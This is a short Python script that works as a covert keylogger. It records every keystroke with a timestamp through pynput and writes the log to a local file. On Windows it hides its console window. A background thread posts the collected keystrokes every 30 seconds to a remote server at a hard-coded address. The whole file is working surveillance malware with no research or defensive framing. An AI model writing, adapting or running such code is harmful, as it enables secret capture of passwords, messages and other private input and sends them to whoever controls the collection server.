import requests
import logging
import os
import sys
import time
import threading
from pynput.keyboard import Listener
from datetime import datetime

# Configuration
LOG_FILE = "logs.txt"
SERVER_URL = "http://192.168.29.218:5000/log"
SEND_INTERVAL = 30  # Send logs every 30 seconds

# Setup logging
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.DEBUG,
    format="%(message)s",
    encoding="utf-8",
    force=True
)

# Buffer for storing keystrokes before sending
keystroke_buffer = []
log_lock = threading.Lock()  # Prevent concurrent file access issues

# Function to send logs to the server
def send_logs():
    global keystroke_buffer
    while True:
        time.sleep(SEND_INTERVAL)
        if keystroke_buffer:
            log_data = "\n".join(keystroke_buffer)
            try:
                response = requests.post(SERVER_URL, data={"log": log_data})
                if response.status_code == 200:
                    with log_lock:
                        keystroke_buffer.clear()  # Clear buffer after successful send
            except Exception as e:
                with log_lock:
                    logging.error(f"Error sending logs: {e}")

# Function to capture keystrokes
def on_press(key):
    global keystroke_buffer
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        key_char = key.char
    except AttributeError:
        key_char = str(key)

    log_message = f"[{timestamp}] {key_char}"

    # Log and force immediate writing
    with log_lock, open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(log_message + "\n")
        f.flush()
        os.fsync(f.fileno())  # Force writing to disk immediately

    with log_lock:
        keystroke_buffer.append(log_message)

# Hide console (for Windows)
def hide_console():
    if sys.platform == "win32":
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Main function   previous one working perfectyly
def main():
    hide_console()  # Hide console window on Windows
    threading.Thread(target=send_logs, daemon=True).start()

    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
